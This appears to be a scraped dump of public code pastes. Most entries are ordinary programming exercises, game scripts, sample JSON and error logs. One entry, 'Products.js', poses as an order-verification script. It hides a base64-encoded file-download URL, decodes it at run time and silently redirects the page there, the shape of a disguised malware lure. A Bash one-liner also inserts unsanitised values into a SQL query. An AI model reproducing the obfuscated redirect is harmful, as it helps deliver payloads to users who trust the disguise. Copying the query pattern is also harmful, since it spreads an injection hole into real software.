pygame.quit()"
eZ0hHxyK,Farm,YanislavD,JavaScript,Monday 7th of April 2025 11:18:02 AM CDT,"function solve (input) {

    const countFarmers = input.shift();
    let farmers = [];

    for (let i = 0; i < countFarmers; i++) {
        let currentFarmer = input.shift().split(' ');
        const farmerName = currentFarmer.shift();
        const workArea = currentFarmer.shift();
        let tasks = currentFarmer.shift().split(',');

        let farmer = {
            name: farmerName,
            workArea: workArea,
            tasks: tasks
        };

        farmers.push(farmer);
    }

    let tokens = input.shift().split(' / ');

    while(tokens[0] !== ""End"") {

        switch (tokens[0]) {

            case 'Execute': {
                const farmerName = tokens[1];
                const workArea = tokens[2];
                const task = tokens[3];

                let farmer = farmers.find(f => f.name === farmerName);

                if (farmer.workArea === workArea && farmer.tasks.includes(task)) {
                    console.log(`${farmerName} has executed the task: ${task}!`);
                } else {
                    console.log(`${farmerName} cannot execute the task: ${task}.`);
                }
                break;
            }

            case `Change Area`: {
                const farmerName = tokens[1];
                const newWorkArea = tokens[2];

                farmers.find(f => f.name === farmerName).workArea = newWorkArea;

                console.log(`${farmerName} has changed their work area to: ${newWorkArea}`)
                break;
            }

            case `Learn Task`: {
                const farmerName = tokens[1];
                const newTask = tokens[2];

                if (farmers.find(f => f.name === farmerName).tasks.includes(newTask)) {
                    console.log(`${farmerName} already knows how to perform ${newTask}.`);
                } else {
                    farmers.find(f => f.name === farmerName).tasks.push(newTask);
                    console.log(`${farmerName} has learned a new task: ${newTask}.`);
                }
                break;
            }
        }


        tokens = input.shift().split(' / ');
    }

    for (let farmer of farmers) {
       farmer.tasks.sort((a, b) => a.localeCompare(b));
       console.log(`Farmer: ${farmer.name}, Area: ${farmer.workArea}, Tasks: ${farmer.tasks.join(', ')}`);
    }

}

solve([ 
    ""2"", 
    ""John garden watering,weeding"", 
    ""Mary barn feeding,cleaning"", 
    ""Execute / John / garden / watering"", 
    ""Execute / Mary / garden / feeding"", 
    ""Learn Task / John / planting"", 
    ""Execute / John / garden / planting"", 
    ""Change Area / Mary / garden"", 
    ""Execute / Mary / garden / cleaning"", 
    ""End"" 
  ] )
"
2DXWEe8g,Projeto CG,Diogo03,C++,Monday 7th of April 2025 11:14:41 AM CDT,"#include <GL/glut.h>
#include <bits/stdc++.h>

const double PI = M_PI;

bool touch(float x1, float y1, float x2, float y2, float r1, float r2) {
    double d = sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2));
    return (d <= r1 + r2);
}

void drawCircle(double cx, double cy, double r, int segments) {
    glBegin(GL_LINE_LOOP);
    for (int i = 0; i < segments; i++) {
        double theta = 2.0 * PI * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawFilledCircle(double cx, double cy, double r, int segments) {
    glBegin(GL_POLYGON);
    for (int i = 0; i < segments; i++) {
        double theta = 2.0 * PI * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawLeftPenaltyArc(double cx, double cy, double r, int segments) {
    double startAngle = -0.87;
    double endAngle   =  0.87;
    glBegin(GL_LINE_STRIP);
    for (int i = 0; i <= segments; i++) {
        double theta = startAngle + (endAngle - startAngle) * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawRightPenaltyArc(double cx, double cy, double r, int segments) {
    double startAngle = 3.14 - 0.87;
    double endAngle   = 3.14 + 0.87;
    glBegin(GL_LINE_STRIP);
    for (int i = 0; i <= segments; i++) {
        double theta = startAngle + (endAngle - startAngle) * i / segments;
        double x = r * cos(theta);
        double y = r * sin(theta);
        glVertex2f(cx + x, cy + y);
    }
    glEnd();
}

void drawGoalInsideArea(double x, double y) {
    double goalWidth = 2.5;
    double goalHeight = 10.5;
    
    glBegin(GL_LINE_LOOP);
        glVertex2f(x, y);
        glVertex2f(x + goalWidth, y);
        glVertex2f(x + goalWidth, y + goalHeight);
        glVertex2f(x, y + goalHeight);
    glEnd();
}

void display() {
    glClear(GL_COLOR_BUFFER_BIT);
    glColor3f(1, 1, 1);

    glBegin(GL_LINE_LOOP);
        glVertex2f(0, 0);
        glVertex2f(105, 0);
        glVertex2f(105, 68);
        glVertex2f(0, 68);
    glEnd();

    glBegin(GL_LINES);
        glVertex2f(52.5, 0);
        glVertex2f(52.5, 68);
    glEnd();

    drawCircle(52.5, 34, 9.15, 100);

    glBegin(GL_LINE_LOOP);
        glVertex2f(0, 13.85);
        glVertex2f(16.5, 13.85);
        glVertex2f(16.5, 54.15);
        glVertex2f(0, 54.15);
    glEnd();

    glBegin(GL_LINE_LOOP);
        glVertex2f(105, 13.85);
        glVertex2f(88.5, 13.85);
        glVertex2f(88.5, 54.15);
        glVertex2f(105, 54.15);
    glEnd();

    drawLeftPenaltyArc(10.65, 34, 9.15, 100);
    drawRightPenaltyArc(94.35, 34, 9.15, 100);

    glPointSize(5.0);
    glBegin(GL_POINTS);
        glVertex2f(11, 34);
    glEnd();
    glBegin(GL_POINTS);
        glVertex2f(94, 34);
    glEnd();
    glBegin(GL_POINTS);
        glVertex2f(52.5, 34);
    glEnd();

    double leftGoalY = 34 - (10.5 / 2);
    double rightGoalY = 34 - (10.5 / 2);
    drawGoalInsideArea(0, leftGoalY);
    drawGoalInsideArea(105 - 2.5, rightGoalY);

    glutSwapBuffers();
}


void init() {
    glClearColor(0.0f, 0.5f, 0.0f, 1.0f); 
    glMatrixMode(GL_PROJECTION);
    glLoadIdentity();
    gluOrtho2D(0.0, 105.0, 0.0, 68.0);
}

int main(int argc, char** argv) {
    glutInit(&argc, argv);
    glutInitDisplayMode(GLUT_DOUBLE | GLUT_RGB);
    glutInitWindowSize(1050, 680);
    glutCreateWindow(""Campo de Futebol 2D"");
    init();
    glutDisplayFunc(display);
    glutMainLoop();
    return 0;
}
"
Q5NcJaWV,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:59:03 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;


int main() {
    ll k, x;
    cin >> k >> x;
    
    ll res = 1e18;
    if(x % k == 0) {
        res = x / k;
    }
    
    ll power = 1;
    for(int i = 0; i <= 100; i++) {
        ll tmp = power * k;
        if(tmp > x) {
            break;
        }
        if(x % tmp == 0) {
            ll n = x / tmp;
            if(n * tmp == x) {
                res = min(res, n + i);
            }
        }
        power *= k;
    }
    if(res == 1e18) {
        res = -1;
    }
    cout << res << endl;
        
    return 0;
}
"
YDHffFXx,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:42:32 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;


int main() {
    int a, b;
    cin >> a >> b;
    
    if(a < b) {
        swap(a, b);
    }
    
    int res = 2e9;
    for(int i = 0; i <= a; i++) {
        if(((a - i) % 3 != 0) and ((b + i) % 3 != 0)) {
            res = min(res, abs((b + i) - (a - i)));
        }
    }
    cout << res << endl;
    
    
    return 0;
}
"
Xh0RmyND,Untitled,devzeus,JSON,Monday 7th of April 2025 10:37:34 AM CDT,"{""maxamount"": 0.02,""cooldown"": 660, ""grest"": 10, ""max_sol"": 0.0004, ""max_pepe"": 500}"
KD3LYtMD,userData,zXenoc,JSON,Monday 7th of April 2025 10:34:46 AM CDT,"[
  {
    ""id"": 1,
    ""name"": ""Leanne Graham"",
    ""username"": ""Bret"",
    ""email"": ""Sincere@april.biz"",
	""permission: worker""
    ""address"": {
      ""street"": ""Kulas Light"",
      ""suite"": ""Apt. 556"",
      ""city"": ""Gwenborough"",
      ""zipcode"": ""92998-3874"",
      ""geo"": {
        ""lat"": ""-37.3159"",
        ""lng"": ""81.1496""
      }
    },
    ""phone"": ""1-770-736-8031 x56442"",
    ""website"": ""hildegard.org"",
    ""company"": {
      ""name"": ""Romaguera-Crona"",
      ""catchPhrase"": ""Multi-layered client-server neural-net"",
      ""bs"": ""harness real-time e-markets""
    }
  },
  {
    ""id"": 2,
    ""name"": ""Ervin Howell"",
    ""username"": ""Antonette"",
    ""email"": ""Shanna@melissa.tv"",
	""permission: admin""
    ""address"": {
      ""street"": ""Victor Plains"",
      ""suite"": ""Suite 879"",
      ""city"": ""Wisokyburgh"",
      ""zipcode"": ""90566-7771"",
      ""geo"": {
        ""lat"": ""-43.9509"",
        ""lng"": ""-34.4618""
      }
    },
    ""phone"": ""010-692-6593 x09125"",
    ""website"": ""anastasia.net"",
    ""company"": {
      ""name"": ""Deckow-Crist"",
      ""catchPhrase"": ""Proactive didactic contingency"",
      ""bs"": ""synergize scalable supply-chains""
    }
  },
  {
    ""id"": 3,
    ""name"": ""Clementine Bauch"",
    ""username"": ""Samantha"",
    ""email"": ""Nathan@yesenia.net"",
	""permission: manager""
    ""address"": {
      ""street"": ""Douglas Extension"",
      ""suite"": ""Suite 847"",
      ""city"": ""McKenziehaven"",
      ""zipcode"": ""59590-4157"",
      ""geo"": {
        ""lat"": ""-68.6102"",
        ""lng"": ""-47.0653""
      }
    },
    ""phone"": ""1-463-123-4447"",
    ""website"": ""ramiro.info"",
    ""company"": {
      ""name"": ""Romaguera-Jacobson"",
      ""catchPhrase"": ""Face to face bifurcated interface"",
      ""bs"": ""e-enable strategic applications""
    }
  },
  {
    ""id"": 4,
    ""name"": ""Patricia Lebsack"",
    ""username"": ""Karianne"",
    ""email"": ""Julianne.OConner@kory.org"",
    ""address"": {
      ""street"": ""Hoeger Mall"",
      ""suite"": ""Apt. 692"",
      ""city"": ""South Elvis"",
      ""zipcode"": ""53919-4257"",
      ""geo"": {
        ""lat"": ""29.4572"",
        ""lng"": ""-164.2990""
      }
    },
    ""phone"": ""493-170-9623 x156"",
    ""website"": ""kale.biz"",
    ""company"": {
      ""name"": ""Robel-Corkery"",
      ""catchPhrase"": ""Multi-tiered zero tolerance productivity"",
      ""bs"": ""transition cutting-edge web services""
    }
  },
  {
    ""id"": 5,
    ""name"": ""Chelsey Dietrich"",
    ""username"": ""Kamren"",
    ""email"": ""Lucio_Hettinger@annie.ca"",
    ""address"": {
      ""street"": ""Skiles Walks"",
      ""suite"": ""Suite 351"",
      ""city"": ""Roscoeview"",
      ""zipcode"": ""33263"",
      ""geo"": {
        ""lat"": ""-31.8129"",
        ""lng"": ""62.5342""
      }
    },
    ""phone"": ""(254)954-1289"",
    ""website"": ""demarco.info"",
    ""company"": {
      ""name"": ""Keebler LLC"",
      ""catchPhrase"": ""User-centric fault-tolerant solution"",
      ""bs"": ""revolutionize end-to-end systems""
    }
  },
  {
    ""id"": 6,
    ""name"": ""Mrs. Dennis Schulist"",
    ""username"": ""Leopoldo_Corkery"",
    ""email"": ""Karley_Dach@jasper.info"",
    ""address"": {
      ""street"": ""Norberto Crossing"",
      ""suite"": ""Apt. 950"",
      ""city"": ""South Christy"",
      ""zipcode"": ""23505-1337"",
      ""geo"": {
        ""lat"": ""-71.4197"",
        ""lng"": ""71.7478""
      }
    },
    ""phone"": ""1-477-935-8478 x6430"",
    ""website"": ""ola.org"",
    ""company"": {
      ""name"": ""Considine-Lockman"",
      ""catchPhrase"": ""Synchronised bottom-line interface"",
      ""bs"": ""e-enable innovative applications""
    }
  },
  {
    ""id"": 7,
    ""name"": ""Kurtis Weissnat"",
    ""username"": ""Elwyn.Skiles"",
    ""email"": ""Telly.Hoeger@billy.biz"",
    ""address"": {
      ""street"": ""Rex Trail"",
      ""suite"": ""Suite 280"",
      ""city"": ""Howemouth"",
      ""zipcode"": ""58804-1099"",
      ""geo"": {
        ""lat"": ""24.8918"",
        ""lng"": ""21.8984""
      }
    },
    ""phone"": ""210.067.6132"",
    ""website"": ""elvis.io"",
    ""company"": {
      ""name"": ""Johns Group"",
      ""catchPhrase"": ""Configurable multimedia task-force"",
      ""bs"": ""generate enterprise e-tailers""
    }
  },
  {
    ""id"": 8,
    ""name"": ""Nicholas Runolfsdottir V"",
    ""username"": ""Maxime_Nienow"",
    ""email"": ""Sherwood@rosamond.me"",
    ""address"": {
      ""street"": ""Ellsworth Summit"",
      ""suite"": ""Suite 729"",
      ""city"": ""Aliyaview"",
      ""zipcode"": ""45169"",
      ""geo"": {
        ""lat"": ""-14.3990"",
        ""lng"": ""-120.7677""
      }
    },
    ""phone"": ""586.493.6943 x140"",
    ""website"": ""jacynthe.com"",
    ""company"": {
      ""name"": ""Abernathy Group"",
      ""catchPhrase"": ""Implemented secondary concept"",
      ""bs"": ""e-enable extensible e-tailers""
    }
  },
  {
    ""id"": 9,
    ""name"": ""Glenna Reichert"",
    ""username"": ""Delphine"",
    ""email"": ""Chaim_McDermott@dana.io"",
    ""address"": {
      ""street"": ""Dayna Park"",
      ""suite"": ""Suite 449"",
      ""city"": ""Bartholomebury"",
      ""zipcode"": ""76495-3109"",
      ""geo"": {
        ""lat"": ""24.6463"",
        ""lng"": ""-168.8889""
      }
    },
    ""phone"": ""(775)976-6794 x41206"",
    ""website"": ""conrad.com"",
    ""company"": {
      ""name"": ""Yost and Sons"",
      ""catchPhrase"": ""Switchable contextually-based project"",
      ""bs"": ""aggregate real-time technologies""
    }
  },
  {
    ""id"": 10,
    ""name"": ""Clementina DuBuque"",
    ""username"": ""Moriah.Stanton"",
    ""email"": ""Rey.Padberg@karina.biz"",
    ""address"": {
      ""street"": ""Kattie Turnpike"",
      ""suite"": ""Suite 198"",
      ""city"": ""Lebsackbury"",
      ""zipcode"": ""31428-2261"",
      ""geo"": {
        ""lat"": ""-38.2386"",
        ""lng"": ""57.2232""
      }
    },
    ""phone"": ""024-648-3804"",
    ""website"": ""ambrose.net"",
    ""company"": {
      ""name"": ""Hoeger LLC"",
      ""catchPhrase"": ""Centralized empowering task-force"",
      ""bs"": ""target end-to-end models""
    }
  }
]"
n319zsgZ,7-4-25 vectores,Aluneth,C,Monday 7th of April 2025 10:33:32 AM CDT,"#include <stdio.h>
#include <stdlib.h>

/* Elaborar una función que reciba tres enteros y nos retorne el valor promedio de los mismos */

float calcularPromedio(int num1, int num2, int num3, float uno) {
    float p;
    p=(num1+num2+num3/uno)/3;

    return p;
}


int main()
{
    int num1, num2, num3;
    float uno, promedio;
    uno = 1;

    printf(""Ingrese el valor 1: "");
    scanf(""%d"", &num1);
    printf(""Ingrese el valor 2: "");
    scanf(""%d"", &num2);
    printf(""Ingrese el valor 3: "");
    scanf(""%d"", &num3);

    promedio=calcularPromedio(num1,num2,num3,uno);

    printf(""\nEl promedio es: %.2f"", promedio);

    return 0;
}


#include <stdio.h>
#include <stdlib.h>

/* Confeccionar un programa que defina dos funciones, una que permita cargar un vector de 5 elementos enteros y otra que muestre un vector de 5 elementos enteros.
En la función main definir una variable de tipo vector y seguidamente llamar a las dos funciones. */

void cargarVector(int v[5])
{
    for (int i = 0; i<5; i++)
    {
        printf(""Introduzca el valor %d: "", i+1);
        scanf(""%d"", &v[i]);
    }
}

void mostrarVector(int v[5]) {
    for (int i = 0; i<5; i++)
    {
        printf(""%d - "", v[i]);
    }
}

int main()
{
    int vector[5];
    cargarVector(vector);
    mostrarVector(vector);
    return 0;
}

"
E2uNC9Q6,Untitled,Josif_tepe,C++,Monday 7th of April 2025 10:29:51 AM CDT,"#include <iostream>
using namespace std;

typedef long long ll;

ll dist(ll x, ll y, ll x2, ll y2) {
    return llabs(x - x2) + llabs(y - y2);
}
int main() {
    ll W, H, C, R;
    cin >> W >> H >> C >> R;
    
    ll x = W / C;
    ll res1 = dist(x * C, x * R, W, H);
    
    x++;
    ll res2 = dist(x * C, x * R, W, H);
    
    x = H / R;
    ll res3 = dist(x * C, x * R, W, H);
    
    x++;
    ll res4 = dist(x * C, x * R, W, H);
    
    cout << min(min(res1, res2), min(res3, res4)) << endl;
    
    
    
    return 0;
}
"
RXXX49gv,Untitled,Andresleo2573,Bash,Monday 7th of April 2025 10:05:43 AM CDT,"find /var/log/apache2/ -type f -name '*.log' ! -name '*error*' -exec grep proxy.pac {} \; | sort| cut -d"" "" -f1| uniq | while read ip; do resultado=$(mysql expedientes -se ""select u.direccion_ip ,u.usuario, u.email from usuarios_actividad ua left join usuarios u ON u.id_usuario  = ua.id_usuario where ua.ip = '$ip'  order by id_actividad desc  limit 1;""); if [[ ""$resultado"" != *""NULL""* ]]; then echo ""$resultado"";  fi; done > ip_usuario_email.txt"
9Wury0Pf,Click GUI,Parallaxox,Lua,Monday 7th of April 2025 09:56:50 AM CDT,"--https://youtu.be/j5h2DvXeHEU

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild(""PlayerGui"")

local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""ClickGui""
screenGui.Parent = playerGui


local clickButton = Instance.new(""TextButton"")
clickButton.Size = UDim2.new(0.2,0,0.1,0)
clickButton.Position = UDim2.new(0.02,0,0.45,0)
clickButton.BackgroundColor3 = Color3.fromRGB(50,150,255)
clickButton.TextColor3 = Color3.fromRGB(255,255,255)
clickButton.Font = Enum.Font.SourceSansBold
clickButton.TextSize = 24
clickButton.Text = ""Click Me""
clickButton.Parent = screenGui


local countLabel = Instance.new(""TextLabel"")
countLabel.Size = UDim2.new(0.2,0,0.08,0)
countLabel.Position = UDim2.new(0.02, 0, 0.35, 0)
countLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
countLabel.TextColor3 = Color3.fromRGB(255,255,255)
countLabel.Font = Enum.Font.SourceSansBold
countLabel.TextSize = 24
countLabel.Text = ""Clicks: 0""
countLabel.Parent = screenGui

local clickCount = 0

local function updateCounter()
	countLabel.Text = ""Clicks: "".. clickCount
end

clickButton.MouseButton1Click:Connect(function()
	clickCount = clickCount + 1
	updateCounter()
end)"
tR6uaMJ8,Untitled,dllbridge,C,Monday 7th of April 2025 09:39:57 AM CDT,"
#include  <iostream>
//#include    <cstring>
using namespace std;


/////////////////////////////////////
int main()
{
	
	string s1 =      ""SONY"", 
	       s2 = "" Pictures"";
	
	string s3 = s1 + s2; 
	
	cout << s3 << endl;	
}



"
rMkaTEFB,asd,ladokhamuji,Python,Monday 7th of April 2025 09:37:04 AM CDT,"total_price = 0
item_count = 0
items = []
discount = 0
delivery_fee = 0
print(""If you have short item or want to end in half way then press 0"")
print()
while item_count < 10:

    print(""Enter the price of the item (only positive number is accepted:"")
    price = float(input())

    if price == 0:
        break
    elif price < 0:
        print(""Not valid ! price should be in positive number only."")
        continue

    print(""Enter the name of the item:"")
    item_name = input()
    print(""Enter the quantity of the item (positive number only):"")
    quantity = int(input())

    if quantity <= 0:
        print(""Error: Quantity must be positive."")
        continue

    items.append({
        ""name"": item_name,
        ""price"": price,
        ""quantity"": quantity
    })

    total_price += price * quantity
    item_count += 1

if total_price == 0:
    print(""Error: No valid items entered. Please retry."")
else:
    if total_price > 100:
        discount = total_price * 0.1
        total_"
xqPtSjnu,VexUpdatedRig IK/FK Script,Velepexon,Python,Monday 7th of April 2025 09:34:41 AM CDT,"# THIS SCRIPT WAS GENERATED BY CHATGPT
# 
import bpy

# Mapping for IK to FK
ik_to_fk_map = {
    ""FK_Arm_1_L"": ""IK-TO-FK-SNAP_ARM_1_L"",
    ""FK_Arm_2_L"": ""IK-TO-FK-SNAP_ARM_2_L"",
    ""FK_Wrist_L"": ""IK-TO-FK-SNAP_WRIST_L"",
    ""FK_Leg_1_L"": ""IK-TO-FK-SNAP_LEG_1_L"",
    ""FK_Leg_2_L"": ""IK-TO-FK-SNAP_LEG_2_L"",
    ""FK_Ankle_L"": ""IK-TO-FK-SNAP_ANKLE_L"",

    ""FK_Arm_1_R"": ""IK-TO-FK-SNAP_ARM_1_R"",
    ""FK_Arm_2_R"": ""IK-TO-FK-SNAP_ARM_2_R"",
    ""FK_Wrist_R"": ""IK-TO-FK-SNAP_WRIST_R"",
    ""FK_Leg_1_R"": ""IK-TO-FK-SNAP_LEG_1_R"",
    ""FK_Leg_2_R"": ""IK-TO-FK-SNAP_LEG_2_R"",
    ""FK_Ankle_R"": ""IK-TO-FK-SNAP_ANKLE_R"",
}

# Mapping for FK to IK
fk_to_ik_map = {
    ""Wrist_IK_L"": ""FK-TO-IK-SNAP_WRIST_IK_L"",
    ""POLE_Elbow_L"": ""FK-TO-IK-SNAP_POLE_ELBOW_L"",
    ""CTRL_FOOT_L"": ""FK-TO-IK-SNAP_CTRL_FOOT_L"",
    ""POLE_Knee_L"": ""FK-TO-IK-SNAP_POLE_KNEE_L"",

    ""Wrist_IK_R"": ""FK-TO-IK-SNAP_WRIST_IK_R"",
    ""POLE_Elbow_R"": ""FK-TO-IK-SNAP_POLE_ELBOW_R"",
    ""CTRL_FOOT_R"": ""FK-TO-IK-SNAP_CTRL_FOOT_R"",
    ""POLE_Knee_R"": ""FK-TO-IK-SNAP_POLE_KNEE_R"",
}

def snap_and_bake(snap_map):
    obj = bpy.context.object
    if obj.mode != 'POSE':
        bpy.ops.object.mode_set(mode='POSE')

    frame = bpy.context.scene.frame_current

    for target_bone, source_bone in snap_map.items():
        try:
            pbone = obj.pose.bones[target_bone]
            source = obj.pose.bones[source_bone]

            # Add Copy Transforms
            constraint = pbone.constraints.new(type='COPY_TRANSFORMS')
            constraint.name = ""TEMP_Snap""
            constraint.target = obj
            constraint.subtarget = source.name

            # Select the bone
            for b in obj.data.bones:
                b.select = False
            obj.data.bones[target_bone].select = True
            bpy.context.view_layer.objects.active = obj

            # Bake the frame
            bpy.ops.nla.bake(
                frame_start=frame,
                frame_end=frame,
                only_selected=True,
                visual_keying=True,
                clear_constraints=False,
                clear_parents=False,
                use_current_action=True,
                bake_types={'POSE'}
            )

            # Remove ONLY the Copy Transforms constraint we just added
            for con in reversed(pbone.constraints):
                if con.type == 'COPY_TRANSFORMS' and con.name == ""TEMP_Snap"":
                    pbone.constraints.remove(con)
                    break

        except KeyError:
            print(f""Bone {target_bone} or {source_bone} not found, skipping."")

# --- Run based on selection
def main():
    selected = [b.name for b in bpy.context.selected_pose_bones]
    to_run = {}

    # Handle IK to FK
    for tgt, src in ik_to_fk_map.items():
        if tgt in selected or src in selected:
            to_run[tgt] = src

    # Handle FK to IK
    for tgt, src in fk_to_ik_map.items():
        if tgt in selected or src in selected:
            to_run[tgt] = src

    snap_and_bake(to_run)

main()"
FiwzNnrJ,How to Double Jump,Parallaxox,Lua,Monday 7th of April 2025 09:17:43 AM CDT,"--https://youtu.be/z0CfDQ9zy0o
local UserInputService = game:GetService(""UserInputService"")
local Players = game:GetService(""Players"")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild(""Humanoid"")
local rootPart = character:WaitForChild(""HumanoidRootPart"")

local jumpHeight = 100
local canDoubleJump = false
local hasDoubleJumped = false

humanoid.StateChanged:Connect(function(_, newState)
	if newState == Enum.HumanoidStateType.Landed then
		canDoubleJump = false
		hasDoubleJumped = false
	end
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end

	if input.KeyCode == Enum.KeyCode.Space then
		if humanoid:GetState() == Enum.HumanoidStateType.Freefall and canDoubleJump and not hasDoubleJumped then
			hasDoubleJumped = true
			rootPart.Velocity = Vector3.new(rootPart.Velocity.X, jumpHeight, rootPart.Velocity.Z)
		elseif humanoid:GetState() ~= Enum.HumanoidStateType.Freefall then
			canDoubleJump = true
		end
	end
end)
"
PAhCNhc6,Products.js,dentira,JavaScript,Monday 7th of April 2025 09:02:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/40979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
3PPbqdvm,7-4-25 Funciones,Aluneth,C,Monday 7th of April 2025 08:56:08 AM CDT,"7-4-2025 Funciones

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Desarrollar un programa con dos funciones aparte de la main. La primer solicite el ingreso de un entero y muestre el cuadrado de dicho valor.
La segunda que solicite la carga de dos valores y muestre el producto de los mismos. Llamar desde la main a ambas funciones. */
void cuadrado()
{
    float numero, cuadrado;
    printf(""Ingrese un numero para calcular su cuadrado: "");
    scanf(""%f"", &numero);
    cuadrado = numero * numero;
    printf(""El cuadrado de %.2f es: %.2f\n\n"", numero, cuadrado);

}

void producto()
{
    float num1, num2, prod;
    printf(""Ingrese un numero: "");
    scanf(""%f"", &num1);
    printf(""Ingrese otro numero: "");
    scanf(""%f"", &num2);
    prod = num1 * num2;
    printf(""El producto de %.f y %.f es: %.f"", num1, num2, prod);

}

int main()
{

    cuadrado();
    producto();

    return 0;
}



#include <stdio.h>
#include <stdlib.h>

/* Desarrollar una función que solicite la carga de tres valores y muestre el menor.
 la función main llamar 3 veces a dicha función.*/

void mostrarMenor()
{
    int num1, num2, num3, menor;
    printf(""Ingrese el numero 1: "");
    scanf(""%d"", &num1);
    printf(""Ingrese el numero 2: "");
    scanf(""%d"", &num2);
    printf(""Ingrese el numero 3: "");
    scanf(""%d"", &num3);

    if (num1 < num2 && num1 < num3)
    {
        printf(""\nEl menor de los numeros es: %d"", num1);
    }
    else if (num2 < num3)
    {
        printf(""\nEl menor de los numeros es: %d"", num2);
    }
    else
    {
        printf(""\nEl menor de los numeros es: %d"", num3);
    }


}

int main()
{
    mostrarMenor();
    mostrarMenor();
    mostrarMenor();
    return 0;
}



#include <stdio.h>
#include <stdlib.h>

void mostrarMayor(int v1, int v2)
{
    if (v1 > v2)
    {
        printf(""El mayor es: %d"", v1);
    }
    else
    {
        printf(""El mayor es: %d"", v2);
    }
}

int main()
{
    int numero1, numero2;
    printf(""Ingrese el numero 1: "");
    scanf(""%d"", &numero1);
    printf(""Ingrese el numero 2: "");
    scanf(""%d"", &numero2);
    mostrarMayor(numero1, numero2);

    return 0;
}



#include <stdio.h>
#include <stdlib.h>

/* Confeccionar un programa que solicite el pago por hora de un empleado y la cantidad de horas trabajadas
dentro de una estructura repetitiva en la función main. Elaborar una función que reciba como parámetro el
valor de la hora y la cantidad de horas trabajadas y nos muestre el total a pagar.*/

void calculaSueldo (float sueldoH, float horasT)
{
    float sueldoTotal = sueldoH * horasT;
    printf(""El sueldo total es de: %.2f"", sueldoTotal);
}

int main()
{

    float sueldoHora, horas;
    char opcion;
    do
    {
        printf(""Ingrese el pago por hora del empleado: "");
        scanf(""%f"", &sueldoHora);
        printf(""Ingrese la cantidad de horas trabajadas: "");
        scanf(""%f"", &horas);
        calculaSueldo(sueldoHora, horas);
        printf(""\n\nDesea realizar otra carga: [s/n]"");
        scanf("" %c"", &opcion);
    }
    while (opcion == 's');
    return 0;
}



#include <stdio.h>
#include <stdlib.h>

void buscarVocal (char caracter)
{
    if (caracter == 'a' || caracter == 'e' || caracter == 'i' || caracter == 'o' | caracter == 'u' || caracter == 'A' || caracter == 'E' | caracter == 'I' || caracter == 'O' || caracter == 'U')
    {
        printf(""\n%c es una vocal. "", caracter);
    }
    else
    {
        printf(""\n%c no es una vocal. "", caracter);
    }
}

int main()
{

    char let;
    printf(""Ingrese un caracter: "");
    scanf(""%c"", &let);
    buscarVocal (let);

    return 0;
}
"
PZuEQAct,2025-04-07T15:47:10.440830,powerampache,PHP,Monday 7th of April 2025 08:47:11 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48378) after 15000ms\"" }"",""stackTrace"":[]}"
21gt2j9A,2025-04-07T15:47:10.434252,powerampache,PHP,Monday 7th of April 2025 08:47:11 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /192.168.88.7 (port 80) from /10.13.82.66 (port 48372) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1137)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:637)
	at java.lang.Thread.run(Thread.java:1012)

